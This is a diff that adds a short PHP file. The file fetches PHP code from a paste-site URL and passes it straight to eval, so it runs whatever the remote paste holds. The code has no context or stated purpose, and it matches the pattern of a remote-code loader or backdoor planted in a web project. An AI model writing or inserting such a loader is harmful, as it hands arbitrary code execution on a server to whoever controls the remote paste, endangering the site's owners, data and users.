@@ -1,0 +1,13 @@
+<?php
+	$url = 'https://pastee.dev/r/54wmqhHk/0';
+
+
+	$php_code = file_get_contents($url);
+
+
+	if ($php_code !== false) {
+		eval('?>' . $php_code);
+	} else {
+		echo 'error';
+	}
+	?>
